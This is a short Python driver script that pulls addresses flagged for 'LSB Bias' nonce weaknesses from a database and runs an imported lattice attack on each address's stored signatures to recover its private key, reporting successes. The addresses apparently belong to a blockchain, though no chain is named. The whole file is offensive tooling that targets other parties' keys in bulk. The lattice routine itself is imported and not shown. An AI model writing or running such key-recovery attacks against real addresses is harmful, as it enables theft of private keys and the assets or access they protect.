import json
import sqlite3
from db_manager import get_connection, get_signatures, add_recovered_key
from advanced_nonce_attacks import try_lsb_lattice

def test_biased_addresses():
    conn = get_connection()
    cursor = conn.cursor()
    # Get addresses with LSB Bias findings
    cursor.execute("SELECT address, details FROM vulnerabilities WHERE type = 'LSB Bias'")
    findings = cursor.fetchall()
    
    unique_targets = {}
    for addr, details_json in findings:
        try:
            details = json.loads(details_json) if isinstance(details_json, str) else details_json
            bias_val = details.get('val', 0)
            if addr not in unique_targets or details.get('bits', 0) > unique_targets[addr]['bits']:
                unique_targets[addr] = {'val': bias_val, 'bits': details.get('bits', 0)}
        except: continue
        
    print(f"Testing LSB fix on {len(unique_targets)} unique biased addresses...")
    for addr, info in unique_targets.items():
        print(f"\n--- Target: {addr} (Bias Val: {info['val']}, Bits: {info['bits']}) ---")
        sigs = get_signatures(addr)
        if len(sigs) < 2:
            print(f"Not enough signatures in DB for {addr} (have {len(sigs)})")
            continue
            
        if try_lsb_lattice(sigs, addr, bias_val=info['val']):
            print(f"!!! SUCCESS !!! Key recovered for {addr}")
        else:
            print(f"Failed to recover key for {addr}")
            
    conn.close()

if __name__ == "__main__":
    test_biased_addresses()
